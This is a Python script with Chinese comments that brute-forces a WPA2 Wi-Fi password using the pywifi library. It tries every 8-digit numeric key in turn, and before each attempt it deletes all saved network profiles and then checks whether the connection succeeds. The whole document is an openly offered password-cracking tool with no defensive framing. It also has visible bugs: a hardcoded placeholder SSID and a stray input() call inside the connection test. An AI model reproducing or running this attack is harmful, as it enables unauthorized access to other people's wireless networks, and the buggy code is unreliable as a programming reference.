import time#时间
import random
import pywifi#导入wifi库
from pywifi import const#引用一些定义
# 主要流程就是获取网卡接口，删除网卡上的所有wifi信息，建立wifi链接文件，写入密码
# 把新的链接文件链接上去
class PoJie:
    def __init__(self):
        wifi=pywifi.PyWiFi()#抓取网卡接口
        self.iface=wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect()#测试链接断开所有链接
        time.sleep(1)#休眠1秒
        #测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
    def readPassWord(self):
        print('开始破解：')
        for i in range(100000000): #原 for i in range(100000000): 发神经以为random.randint可以产生指定的很多实数，结果只返回一个   for i in random.randint(1,100000000,100000000):
            myStr = str(i).zfill(8)
            bool1 = self.test_connect(myStr)
            if bool1:
                print('密码正确：', myStr)
                break
            else:
                print('密码错误：' + myStr)
        ent=time.time()
        print('用时%f分'%((ent - stm)/60))
    def test_connect(self,findStr):#测试链接
        profile=pywifi.Profile()#创建wifi链接文件
        profile.ssid='wi_name'#wifi名称 密码要自己重写输入
        wi_name = input(str()) # 注意要为字符串格式
        profile.auth=const.AUTH_ALG_OPEN#网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher=const.CIPHER_TYPE_CCMP#加密单元
        profile.key=findStr#密码 这里密码随机生成的
        self.iface.remove_all_network_profiles()#删除所有的wifi文件
        tmp_profile=self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(5)#这里可以更改链接所需要的时间，单位是秒
        if self.iface.status()==const.IFACE_CONNECTED:#判断是否连接上
            isOK=True
        else:
            isOK=False
        self.iface.disconnect()#断开
        time.sleep(1)#这里可以更改断开链接所需要的时间，单位是秒
        #检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
        return isOK
stm=time.time()
PoJie().readPassWord()